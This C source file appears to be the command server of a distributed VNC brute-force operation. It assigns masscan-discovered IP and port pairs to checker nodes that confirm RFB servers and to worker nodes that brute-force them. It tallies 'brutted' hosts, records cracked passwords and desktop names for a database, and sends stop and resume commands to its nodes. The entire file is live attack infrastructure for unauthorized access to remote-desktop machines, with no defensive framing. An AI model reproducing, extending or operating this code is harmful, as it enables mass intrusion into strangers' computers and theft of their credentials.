#include "includes.h"

#include <syslib\str.h>

#include "common\json_packet.h"
#include "common_dlg.h"
#include "commands.h"
#include "debug_log_dlg.h"

static void DB_QueueInt(PUPDATE_QUEUE *lppQueue,PUPDATE_QUEUE *lppLastQueue,PUPDATE_QUEUE lpQueue)
{
    if (!*lppQueue)
        *lppQueue=lpQueue;
    else
        (*lppLastQueue)->lpNext=lpQueue;

    *lppLastQueue=lpQueue;
    lpQueue->lpNext=NULL;
    return;
}

static void DB_QueueMasscanUpdate(PCONNECTION lpConnection,PUPDATE_QUEUE *lppQueue,PUPDATE_QUEUE *lppLastQueue,PMASSCAN lpItem,bool bRFB)
{
    PUPDATE_QUEUE lpQueue=(PUPDATE_QUEUE)MemQuickAlloc(sizeof(*lpQueue));
    if (lpQueue)
    {
        lpQueue->lpConnection=lpConnection;

        if (bRFB)
            lpQueue->ut=UT_RFB_FOUND;
        else
            lpQueue->ut=UT_NON_RFB_FOUND;

        lpQueue->mii.dwIP=lpItem->dwIP;
        lpQueue->mii.wPort=lpItem->wPort;

        DB_QueueInt(lppQueue,lppLastQueue,lpQueue);
    }
    return;
}

static void DB_QueueUpdate(PUPDATE_QUEUE *lppQueue,PUPDATE_QUEUE *lppLastQueue,PRFB_SERVER lpItem)
{
    do
    {
        PUPDATE_QUEUE lpQueue=(PUPDATE_QUEUE)MemQuickAlloc(sizeof(*lpQueue));
        if (!lpQueue)
            break;

        lpQueue->lpConnection=lpItem->Assigned.lpAssignedTo;
        lpQueue->ut=UT_BAD_UPDATE;

        lpQueue->bii.dwIP=lpItem->dwIP;
        lpQueue->bii.wPort=lpItem->wPort;
        lpQueue->bii.dwIdx=lpItem->dwIdx;
        lpQueue->bii.dwFlg=lpItem->dwFlags;

        DB_QueueInt(lppQueue,lppLastQueue,lpQueue);
    }
    while (false);
    return;
}

static void DB_QueueDone(PUPDATE_QUEUE *lppQueue,PUPDATE_QUEUE *lppLastQueue,PRFB_SERVER lpItem,LPCSTR lpPwd,LPCSTR lpDesk)
{
    PUPDATE_QUEUE lpQueue=(PUPDATE_QUEUE)MemQuickAlloc(sizeof(*lpQueue));
    if (lpQueue)
    {
        lpQueue->lpConnection=lpItem->Assigned.lpAssignedTo;
        lpQueue->ut=UT_GOOD_FOUND;

        lpQueue->gii.dwIP=lpItem->dwIP;
        lpQueue->gii.wPort=lpItem->wPort;
        lpQueue->gii.dwIdx=lpItem->dwIdx;
        lpQueue->gii.bNoAuth=true;
        lpQueue->gii.lpDesktop=StrDuplicateA(lpDesk,0);

        if (lpPwd)
        {
            lpQueue->gii.bNoAuth=false;
            lstrcpyA(lpQueue->gii.szPassword,lpPwd);
        }

        DB_QueueInt(lppQueue,lppLastQueue,lpQueue);
    }
    return;
}

static void Command_ParseResult(cJSON *jsPacket,PCONNECTION lpConnection,bool bHelloPacket)
{
    do
    {
        cJSON *jsResult=cJSON_GetObjectItem(jsPacket,"result");
        if (!jsResult)
            break;

        DWORD dwPrevTasks=lpConnection->Sts.dwActiveTask;
        lpConnection->Sts.dwActiveTask=cJSON_GetIntFromObject(jsPacket,"active_tasks");

        if (lpConnection->dwType == TYPE_CHECKER)
        {
            lpConnection->dwLastStatUpdate=Now();

            InterlockedExchangeSubtract(&dwCheckersTasks,dwPrevTasks);
            InterlockedExchangeAdd(&dwCheckersTasks,lpConnection->Sts.dwActiveTask);
        }
        else
        {
            lpConnection->dwLastStatUpdate=Now();

            InterlockedExchangeSubtract(&dwWorkersTasks,dwPrevTasks);
            InterlockedExchangeAdd(&dwWorkersTasks,lpConnection->Sts.dwActiveTask);
        }

        DWORD dwCount=cJSON_GetArraySize(jsResult);
        if (!dwCount)
            break;

        PUPDATE_QUEUE lpUpdateQueue=NULL,lpLastQueue=NULL;
        switch (lpConnection->dwType)
        {
            case TYPE_WORKER:
            {
                for (DWORD i=0; i < dwCount; i++)
                {
                    cJSON *jsItem=cJSON_GetArrayItem(jsResult,i);
                    if (!jsItem)
                        break;

                    DWORD dwIP=(DWORD)cJSON_GetIntFromObject(jsItem,"ip");
                    DWORD dwIdx=cJSON_GetIntFromObject(jsItem,"idx");
                    WORD wPort=(WORD)cJSON_GetIntFromObject(jsItem,"port");

                    PRFB_SERVER lpItem=Worker_FindServer(lpConnection,dwIP,wPort);
                    if (!lpItem)
                    {
                        DebugLog_AddItem2(lpConnection,LOG_LEVEL_WARNING,"Worker_FindServer(\"%s\",%d) failed",NetNtoA(dwIP),wPort);
                        continue;
                    }

                    DWORD dwResult=cJSON_GetIntFromObject(jsItem,"result");
                    switch (dwResult)
                    {
                        case WKR_RESULT_DONE:
                        {
                            InterlockedIncrement(&lpConnection->Sts.ws.dwBrutted);
                            InterlockedIncrement(&dwBrutted);
                            InterlockedDecrement(&dwItemsToBrute);
                            InterlockedDecrement(&dwWorkerItemsUsed);

                            LPCSTR lpPwd=cJSON_GetStringFromObject(jsItem,"pwd"),
                                   lpDesk=cJSON_GetStringFromObject(jsItem,"desk");

                            lpItem->dwIdx=dwIdx;
                            DB_QueueDone(&lpUpdateQueue,&lpLastQueue,lpItem,lpPwd,lpDesk);
                            break;
                        }
                        case WKR_RESULT_NOT_RFB:
                        {
                            lpItem->dwFlags|=DB_FLG_NOT_RFB;
                            DB_QueueUpdate(&lpUpdateQueue,&lpLastQueue,lpItem);

                            InterlockedDecrement(&dwItemsToBrute);
                            InterlockedDecrement(&dwWorkerItemsUsed);
                            lpItem->bDontUseMe=true;
                            break;
                        }
                        case WKR_RESULT_UNSUPPORTED:
                        {
                            lpItem->dwFlags|=DB_FLG_UNSUPPORTED;
                            DB_QueueUpdate(&lpUpdateQueue,&lpLastQueue,lpItem);

                            InterlockedIncrement(&lpConnection->Sts.ws.dwUnsupported);
                            InterlockedIncrement(&dwUnsupported);
                            InterlockedDecrement(&dwItemsToBrute);
                            InterlockedDecrement(&dwWorkerItemsUsed);
                            lpItem->bDontUseMe=true;
                            break;
                        }
                        case WKR_RESULT_OUT_OF_DICT:
                        {
                            lpItem->dwFlags|=DB_FLG_OUT_OF_DICT;
                            DB_QueueUpdate(&lpUpdateQueue,&lpLastQueue,lpItem);

                            InterlockedDecrement(&dwItemsToBrute);
                            InterlockedDecrement(&dwWorkerItemsUsed);
                            lpItem->bDontUseMe=true;
                            break;
                        }
                        case WKR_RESULT_FAILED:
                        {
                            Worker_FreeServer(lpItem);
                        }
                        case WKR_RESULT_IN_USE:
                        {
                            bool bUpdated=(lpItem->dwIdx != dwIdx);

                            lpItem->dwIdx=dwIdx;
                            lpItem->dwLastActivityTime=Now();

                            if (bUpdated)
                                DB_QueueUpdate(&lpUpdateQueue,&lpLastQueue,lpItem);

                            if (lpItem->Assigned.lpAssignedTo)
                                break;

                            if (!bHelloPacket)
                            {
                                InterlockedDecrement(&dwActiveServers);
                                break;
                            }

                            if (dwResult != WKR_RESULT_IN_USE)
                                break;

                            lpItem->dwLastActivityTime=Now();
                            List_AssignItem(lpConnection,lpItem);

                            InterlockedIncrement(&dwActiveServers);
                            break;
                        }
                    }
                }
                break;
            }
            case TYPE_CHECKER:
            {
                for (DWORD i=0; i < dwCount; i++)
                {
                    cJSON *jsItem=cJSON_GetArrayItem(jsResult,i);
                    if (!jsItem)
                        break;

                    lpConnection->Sts.cs.dwChecked++;
                    InterlockedIncrement(&dwChecked);

                    MASSCAN msItem;
                    msItem.dwIP=(DWORD)cJSON_GetIntFromObject(jsItem,"ip");
                    msItem.wPort=(WORD)cJSON_GetIntFromObject(jsItem,"port");

                    switch (cJSON_GetIntFromObject(jsItem,"result"))
                    {
                        case CKR_RESULT_RFB:
                        {
                            lpConnection->Sts.cs.dwRFB++;
                            InterlockedIncrement(&dwRFB);

                            DB_QueueMasscanUpdate(lpConnection,&lpUpdateQueue,&lpLastQueue,&msItem,true);
                            break;
                        }
                        case CKR_RESULT_NOT_RFB:
                        {
                            lpConnection->Sts.cs.dwNotRFB++;
                            InterlockedIncrement(&dwNotRFB);

                            DB_QueueMasscanUpdate(lpConnection,&lpUpdateQueue,&lpLastQueue,&msItem,false);
                            break;
                        }
                        case CKR_RESULT_FAILED:
                        {
                            lpConnection->Sts.cs.dwFailed++;
                            InterlockedIncrement(&dwUnavailble);

                            Checker_FreeAddress(lpConnection,msItem.dwIP,msItem.wPort);
                            break;
                        }
                    }
                }
                break;
            }
        }

        DB_PostUpdateQueue(lpUpdateQueue);
        lpUpdateQueue=NULL;
        lpLastQueue=NULL;
    }
    while (false);
    return;
}

static void Command_HandleGetItemsPacket(PCONNECTION lpConnection,cJSON *jsPacket)
{
    do
    {
        DWORD dwItemsRequested,dwCount=(DWORD)cJSON_GetIntFromObject(jsPacket,"items");
        if (!dwCount)
            dwCount=1;

        dwItemsRequested=dwCount;

        cJSON *jsArray=cJSON_CreateArray();
        if (!jsArray)
            break;

        switch (lpConnection->dwType)
        {
            case TYPE_WORKER:
            {
                if (!InterlockedExchangeAdd(&dwItemsToBrute,0))
                    break;

                if (!InterlockedExchangeAdd(&dwWorkersCount,0))
                    break;

                DWORD dwAverageCount=min(InterlockedExchangeAdd(&dwItemsToBrute,0)/InterlockedExchangeAdd(&dwWorkersCount,0),dwCount);
                if (!dwAverageCount)
                    dwAverageCount=dwCount;

                for (DWORD i=0; i < dwAverageCount; i++)
                {
                    PRFB_SERVER lpServer=Worker_GetNext(lpConnection);
                    if (!lpServer)
                        break;

                    cJSON *jsItem=cJSON_CreateObject();
                    if (!jsItem)
                        break;

                    cJSON_AddIntToObject(jsItem,"ip",lpServer->dwIP);
                    cJSON_AddIntToObject(jsItem,"port",lpServer->wPort);
                    cJSON_AddIntToObject(jsItem,"idx",lpServer->dwIdx);

                    cJSON_AddItemToArray(jsArray,jsItem);

                    lpConnection->Sts.dwActiveTask++;
                    if (lpConnection->dwType == TYPE_CHECKER)
                        InterlockedIncrement(&dwCheckersTasks);
                    else
                        InterlockedIncrement(&dwWorkersTasks);
                }
                break;
            }
            case TYPE_CHECKER:
            {
                if (!InterlockedExchangeAdd(&dwItemsToCheck,0))
                    break;

                if (!InterlockedExchangeAdd(&dwCheckersCount,0))
                    break;

                dwCount=min(InterlockedExchangeAdd(&dwItemsToCheck,0)/InterlockedExchangeAdd(&dwCheckersCount,0),dwCount);
                for (DWORD i=0; i < dwCount; i++)
                {
                    MASSCAN msItem;
                    if (!Checker_GetNextAddress(lpConnection,&msItem))
                        break;

                    cJSON *jsItem=cJSON_CreateObject();
                    if (!jsItem)
                        break;

                    cJSON_AddIntToObject(jsItem,"ip",msItem.dwIP);
                    cJSON_AddIntToObject(jsItem,"port",msItem.wPort);

                    cJSON_AddItemToArray(jsArray,jsItem);

                    lpConnection->Sts.dwActiveTask++;
                    if (lpConnection->dwType == TYPE_CHECKER)
                        InterlockedIncrement(&dwCheckersTasks);
                    else
                        InterlockedIncrement(&dwWorkersTasks);
                }
                break;
            }
        }

        cJSON *jsResult=cJSON_CreateObject();
        if (jsResult)
        {
            cJSON_AddStringToObject(jsResult,"type","result");
            cJSON_AddStringToObject(jsResult,"cmd","get_items");
            cJSON_AddIntToObject(jsResult,"requested",dwItemsRequested);
            cJSON_AddItemToObject(jsResult,"result",jsArray);
            JSON_SendPacketAndFree(&lpConnection->Socket,jsResult);
        }
        else
            cJSON_Delete(jsArray);
    }
    while (false);
    return;
}

static void Command_HandleResultsPacket(PCONNECTION lpConnection,cJSON *jsPacket)
{
    Command_ParseResult(jsPacket,lpConnection,false);

    if ((lpConnection->dwStatus == STATUS_STOPPING) && (!lpConnection->Sts.dwActiveTask))
    {
        lpConnection->bResultReceived=true;
        lpConnection->dwStatus=STATUS_STOPPED;

        if (lpConnection->dwType == TYPE_WORKER)
            Worker_ResortList();
        else if (lpConnection->dwType == TYPE_CHECKER)
            Checker_NullLastFreeItem();
    }

    if ((bStopping) && (!lpConnection->Sts.dwActiveTask))
        Disconnect(lpConnection);
    return;
}

bool bHelloStat;
static void Command_HandleHelloPacket(PCONNECTION lpConnection,cJSON *jsPacket)
{
    do
    {
        lpConnection->dwStatus=STATUS_STARTED;

        Command_ParseResult(jsPacket,lpConnection,true);

        lpConnection->bNA=false;
        if (!lstrcmpiA(cJSON_GetStringFromObject(jsPacket,"status"),"n/a"))
        {
            lpConnection->bNA=true;
            UpdateConnectionStatus(lpConnection,CS_N_A);
        }

        if (!bHelloStat)
            break;

        cJSON *jsStat=cJSON_GetObjectItem(jsPacket,"stat");
        if (!jsStat)
            break;

        switch (lpConnection->dwType)
        {
            case TYPE_CHECKER:
            {
                lpConnection->Sts.cs.dwChecked+=cJSON_GetIntFromObject(jsStat,"checked");
                InterlockedExchangeAdd(&dwChecked,cJSON_GetIntFromObject(jsStat,"checked"));

                lpConnection->Sts.cs.dwRFB+=cJSON_GetIntFromObject(jsStat,"rfb");
                InterlockedExchangeAdd(&dwRFB,cJSON_GetIntFromObject(jsStat,"rfb"));

                lpConnection->Sts.cs.dwNotRFB+=cJSON_GetIntFromObject(jsStat,"not_rfb");
                InterlockedExchangeAdd(&dwNotRFB,cJSON_GetIntFromObject(jsStat,"not_rfb"));

                lpConnection->Sts.cs.dwFailed+=cJSON_GetIntFromObject(jsStat,"conn_failed");
                InterlockedExchangeAdd(&dwUnavailble,cJSON_GetIntFromObject(jsStat,"conn_failed"));
                break;
            }
            case TYPE_WORKER:
            {
                lpConnection->Sts.ws.dwBrutted+=cJSON_GetIntFromObject(jsStat,"brutted");
                InterlockedExchangeAdd(&dwBrutted,cJSON_GetIntFromObject(jsStat,"brutted"));

                lpConnection->Sts.ws.dwUnsupported+=cJSON_GetIntFromObject(jsStat,"unsupported");
                InterlockedExchangeAdd(&dwUnsupported,cJSON_GetIntFromObject(jsStat,"unsupported"));
                break;
            }
        }

        lpConnection->dwLastStatUpdate=Now();
    }
    while (false);
    return;
}

void Command_ParsePacket(PCONNECTION lpConnection,cJSON *jsPacket)
{
    do
    {
        LPCSTR lpType=cJSON_GetStringFromObject(jsPacket,"type");
        if (!lpType)
            break;

        if (!lstrcmpiA(lpType,"hello"))
        {
            Command_HandleHelloPacket(lpConnection,jsPacket);
            break;
        }

        if (!lstrcmpiA(lpType,"result"))
        {
            Command_HandleResultsPacket(lpConnection,jsPacket);
            break;
        }

        if (!lstrcmpiA(lpType,"cmd"))
        {
            if (!lstrcmpiA(cJSON_GetStringFromObject(jsPacket,"cmd"),"get_items"))
            {
                Command_HandleGetItemsPacket(lpConnection,jsPacket);
                break;
            }

            ///
            break;
        }

        if (!lstrcmpiA(lpType,"log"))
        {
            DebugLog_AddItem(lpConnection,cJSON_GetObjectItem(jsPacket,"log"));
            break;
        }

        if (!lstrcmpiA(lpType,"status"))
        {
            lpConnection->bNA=false;

            if (!lstrcmpiA(cJSON_GetStringFromObject(jsPacket,"status"),"n/a"))
                lpConnection->bNA=true;

            UpdateStats(lpConnection);
            break;
        }
    }
    while (false);
    return;
}

void Command_StopCmd(PCONNECTION lpConnection)
{
    do
    {
        if (!lpConnection)
            break;

        cJSON *jsStopCmd=cJSON_CreateObject();
        if (!jsStopCmd)
            break;

        lpConnection->dwStatus=STATUS_STOPPING;

        cJSON_AddStringToObject(jsStopCmd,"type","cmd");
        cJSON_AddStringToObject(jsStopCmd,"cmd","stop");
        JSON_SendPacketAndFree(&lpConnection->Socket,jsStopCmd);
    }
    while (false);
    return;
}

void Command_ResumeCmd(PCONNECTION lpConnection)
{
    do
    {
        if (!lpConnection)
            break;

        cJSON *jsResumeCmd=cJSON_CreateObject();
        if (!jsResumeCmd)
            break;

        lpConnection->dwStatus=STATUS_STARTED;

        cJSON_AddStringToObject(jsResumeCmd,"type","cmd");
        cJSON_AddStringToObject(jsResumeCmd,"cmd","resume");
        JSON_SendPacketAndFree(&lpConnection->Socket,jsResumeCmd);
    }
    while (false);
    return;
}

void Command_StopAllCmd(HWND hDlg,CONNECTION_TYPE dwType)
{
    cJSON *jsStopCmd=cJSON_CreateObject();
    if (jsStopCmd)
    {
        cJSON_AddStringToObject(jsStopCmd,"type","cmd");
        cJSON_AddStringToObject(jsStopCmd,"cmd","stop");

        PCONNECTION lpConnection=lpConnections;
        while (lpConnection)
        {
            if ((lpConnection->dwType == dwType) && (lpConnection->Socket.hSock != INVALID_SOCKET))
            {
                if (lpConnection->Socket.bConnected)
                {
                    lpConnection->dwStatus=STATUS_STOPPING;
                    JSON_SendPacket(&lpConnection->Socket,jsStopCmd);
                }
                else
                    Disconnect(lpConnection);
            }

            lpConnection=lpConnection->lpNext;
        }
        cJSON_Delete(jsStopCmd);
    }
    return;
}

